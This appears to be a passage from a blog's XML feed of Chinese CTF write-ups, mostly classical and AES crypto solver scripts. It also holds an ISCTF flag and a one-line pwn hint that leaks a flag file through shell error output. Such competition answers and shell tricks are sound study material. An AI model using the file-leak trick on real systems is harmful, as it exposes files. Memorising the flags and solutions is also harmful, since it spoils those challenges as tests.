aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ISCTF{159e34224c00ead2d3a039d32084ee50}</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="nc-pwn"><a href="#nc-pwn" class="headerlink" title="nc_pwn"></a>nc_pwn</h2><p>把flag重定向到sh,通过报错输出</p><p><img src="/2023/02/01/ISCTF/1667477178587.png" alt="1667477178587"></p><pre class="line-numbers language-none"><code class="language-none">把flag重定向到sh,通过报错输出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比赛中遇见的一些密码</title>
      <link href="/2023/01/15/%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AF%86%E7%A0%81/"/>
      <url>/2023/01/15/%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="1、曲路密码"><a href="#1、曲路密码" class="headerlink" title="1、曲路密码"></a>1、曲路密码</h2><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 曲路密码</span><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">encrypt_bend</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> col<span class="token punctuation">,</span> row<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ciphertext <span class="token operator">=</span> <span class="token string">""</span>    temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>        temp<span class="token punctuation">[</span>index <span class="token operator">%</span> col<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    re_temp <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">reversed</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>re_temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> index <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            i <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">reversed</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        ciphertext <span class="token operator">+=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> ciphertext<span class="token keyword">def</span> <span class="token function">decrypt_bend</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> col<span class="token punctuation">,</span> row<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    plaintext <span class="token operator">=</span> <span class="token string">""</span>    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span>    min_row <span class="token operator">=</span> length <span class="token operator">//</span> col       <span class="token comment"># 最小的行数</span>    min_num <span class="token operator">=</span> col <span class="token operator">-</span> length <span class="token operator">%</span> col  <span class="token comment"># 最小行数的列数</span>    <span class="token comment"># 分组</span>    temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> min_num<span class="token punctuation">:</span>            temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>string<span class="token punctuation">[</span>index<span class="token punctuation">:</span>index<span class="token operator">+</span>min_row<span class="token punctuation">]</span><span class="token punctuation">)</span>            index <span class="token operator">+=</span> min_row        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>string<span class="token punctuation">[</span>index<span class="token punctuation">:</span>index<span class="token operator">+</span>min_row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            index <span class="token operator">+=</span> min_row <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token comment"># 改回列顺序</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> index <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment"># print(re.findall(".&#123;1&#125;", temp[index]))</span>            temp<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">reversed</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">".&#123;1&#125;"</span><span class="token punctuation">,</span> temp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    temp<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        plaintext <span class="token operator">+=</span> temp<span class="token punctuation">[</span>i <span class="token operator">%</span> col<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">//</span> col<span class="token punctuation">]</span>    <span class="token keyword">return</span> plaintext<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    col_ <span class="token operator">=</span> <span class="token number">7</span>    row_ <span class="token operator">=</span> <span class="token number">5</span>    ciphertext_ <span class="token operator">=</span> encrypt_bend<span class="token punctuation">(</span><span class="token string">"i will beat you this day"</span><span class="token punctuation">,</span> col_<span class="token punctuation">,</span> row_<span class="token punctuation">)</span>    plaintext_ <span class="token operator">=</span> decrypt_bend<span class="token punctuation">(</span>ciphertext_<span class="token punctuation">,</span> col_<span class="token punctuation">,</span> row_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>plaintext_<span class="token punctuation">&#125;</span></span><span class="token string"> : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ciphertext_<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、仿射密码（Affine-Cipher）"><a href="#2、仿射密码（Affine-Cipher）" class="headerlink" title="2、仿射密码（Affine Cipher）"></a>2、仿射密码（Affine Cipher）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。加密函数：E(x)&#x3D;(ax+b)(mod m)a与b互质，a与m互质m是编码系统中字符的数量(一般是26或者52)解密函数：D(x) &#x3D;a^-1(x-b)(mod m)，其中a-1是a在Zm群的乘法逆元。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">乘法逆元：如果存在a,x,b满足线性同余方程ax ≡ 1(mod b)（即b除以整数ax − 1，或者换句话说，将ax除以整数b之后的余数为1），则我们称：a关于模b的乘法逆元为x，表示为a ≡ x^-1 (mod b)；x关于模b的乘法逆元为a，表示为x ≡ a^-1 (mod b)简单来说，求a的逆，就是找一个x，使得1 &#x3D;(a∗x)(mod n) 也可记作 a^− 1 ≡ x(mod n) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里所求的逆元a^-1  &#x3D;  gmpy2.invert(a,m)</p><h3 id="加密脚本"><a href="#加密脚本" class="headerlink" title="加密脚本"></a>加密脚本</h3><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">c &#x3D; []a&#x3D;b&#x3D;def enc(plaintxt):    for i in plaintxt:        if i.islower():            temp &#x3D; ((ord(i) - 97) * a + b) % 26 + 97             c.append(chr(temp))        elif i.isupper():            temp &#x3D; ((ord(i) - 65) * a + b) % 26 + 65             c.append(chr(temp))        else:            c.append(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历求a的逆元"><a href="#遍历求a的逆元" class="headerlink" title="遍历求a的逆元"></a>遍历求a的逆元</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 遍历得到a的乘法逆元</span><span class="token keyword">def</span> <span class="token function">get_are</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> a <span class="token operator">*</span> i <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">return</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2a<span class="token operator">=</span>b<span class="token operator">=</span>niyuan <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span>p<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">dec</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> niyuan<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span>            p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> niyuan<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span>            p<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、Alien’s-secret"><a href="#3、Alien’s-secret" class="headerlink" title="3、Alien’s_secret"></a>3、Alien’s_secret</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;uazu.net&#x2F;notes&#x2F;alien.html#s2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/01/15/%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AF%86%E7%A0%81/image-20221127200706901.png" alt="image-20221127200706901"></p><h2 id="4-怪异密码"><a href="#4-怪异密码" class="headerlink" title="4.怪异密码"></a>4.怪异密码</h2><p><img src="/2023/01/15/%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AF%86%E7%A0%81/image-20221208185239568.png" alt="image-20221208185239568"></p><p><img src="/2023/01/15/%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E8%A7%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AF%86%E7%A0%81/image-20221208185250317.png" alt="image-20221208185250317"></p><h2 id="5-宇宙终极问题"><a href="#5-宇宙终极问题" class="headerlink" title="5.宇宙终极问题"></a>5.宇宙终极问题</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#(-80538738812075974)³+80435758145817515³+12602123297335631³=42</span>x<span class="token operator">=</span><span class="token number">80538738812075974</span>y<span class="token operator">=</span><span class="token number">80435758145817515</span>z<span class="token operator">=</span><span class="token number">12602123297335631</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-Hill-希尔密码"><a href="#6-Hill-希尔密码" class="headerlink" title="6.Hill(希尔密码)"></a>6.Hill(希尔密码)</h2><p>UTCTF 2020  Hill</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token operator">=</span><span class="token string">'wznqcaduqopfkqnwofDbzgeu'</span>flag_pre<span class="token operator">=</span><span class="token string">'utflag'</span><span class="token keyword">def</span> <span class="token function">getit</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>b1<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>a2<span class="token punctuation">,</span>b2<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>a3<span class="token punctuation">,</span>b3<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a1 <span class="token operator">*</span> i <span class="token operator">+</span> b1 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c1 <span class="token keyword">and</span> <span class="token punctuation">(</span>a2 <span class="token operator">*</span> i <span class="token operator">+</span> b2 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c2 <span class="token keyword">and</span> <span class="token punctuation">(</span>a3 <span class="token operator">*</span> i<span class="token operator">+</span>b3<span class="token operator">*</span>j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c3<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>x1<span class="token operator">=</span>getit<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>x2<span class="token operator">=</span>getit<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">import</span> stringflag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">[</span><span class="token punctuation">(</span>x1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>x1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span>    flag<span class="token operator">+=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">[</span><span class="token punctuation">(</span>x2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>x2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment">#utflagdngeruscphertextqq</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES</title>
      <link href="/2023/01/15/AES/"/>
      <url>/2023/01/15/AES/</url>
      
        <content type="html"><![CDATA[<p>直接通过题目来学习</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES <span class="token keyword">import</span> binascii <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long <span class="token keyword">from</span> aes_flag <span class="token keyword">import</span> flag<span class="token punctuation">,</span>key <span class="token keyword">import</span> os <span class="token comment">#maybe flag is fake</span> iv <span class="token operator">=</span> flag l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">if</span> l<span class="token operator">==</span><span class="token number">16</span><span class="token punctuation">:</span>     hint <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token operator">^</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>     msg <span class="token operator">=</span> <span class="token string">b'Welcome! Good luck have fun! diyicichutiqiuqingpen xiexiele.....'</span>     <span class="token keyword">def</span> <span class="token function">encrypto</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>         aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span>iv<span class="token punctuation">)</span>         <span class="token keyword">return</span> aes<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>encrypto<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''10814139970454569101142970101299943513649261825483864773663646850498898172963892837254881797558641977330505910327448279013601791760702391621769017335029566b'a99b50f2320e2768e94535cac2888a96''''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">if</span> l<span class="token operator">==</span><span class="token number">16</span><span class="token punctuation">:</span>     hint <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>hint<span class="token punctuation">)</span><span class="token operator">^</span>bytes_to_long<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#key是16个字节 而hint是16个重复的4个字节</span><span class="token comment">#所以hint 可以通过异或之后前面的字节求出</span><span class="token comment">#key通过异或求出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -----------get key---------</span>tmp <span class="token operator">=</span> <span class="token number">10814139970454569101142970101299943513649261825483864773663646850498898172963892837254881797558641977330505910327448279013601791760702391621769017335029566</span>hint <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>tmp <span class="token operator">^</span> hint<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">import</span> binascii<span class="token punctuation">,</span> sys<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token comment"># -----------get key---------</span>tmp <span class="token operator">=</span> <span class="token number">10814139970454569101142970101299943513649261825483864773663646850498898172963892837254881797558641977330505910327448279013601791760702391621769017335029566</span>hint <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>key <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>tmp <span class="token operator">^</span> hint<span class="token punctuation">)</span><span class="token comment"># ----------get iv-----------</span>msg <span class="token operator">=</span> <span class="token string">b'Welcome! Good luck have fun! diyicichutiqiuqingpen xiexiele.....'</span>msgs <span class="token operator">=</span> <span class="token punctuation">[</span>msg<span class="token punctuation">[</span>ii<span class="token punctuation">:</span><span class="token punctuation">(</span>ii<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span>msgs<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>IV <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'a99b50f2320e2768e94535cac2888a96'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decry</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>IV<span class="token punctuation">,</span>ms<span class="token punctuation">)</span><span class="token punctuation">:</span>    aes<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span>AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>IV<span class="token punctuation">)</span><span class="token punctuation">,</span>ms<span class="token punctuation">)</span><span class="token keyword">for</span> ms <span class="token keyword">in</span> msgs<span class="token punctuation">:</span>    IV<span class="token operator">=</span>decry<span class="token punctuation">(</span>key<span class="token punctuation">,</span>IV<span class="token punctuation">,</span>ms<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">b'flag&#123;'</span> <span class="token operator">+</span> IV<span class="token operator">+</span> <span class="token string">b'&#125;'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> AES </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECC椭圆曲线</title>
      <link href="/2023/01/15/ECC%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF/"/>
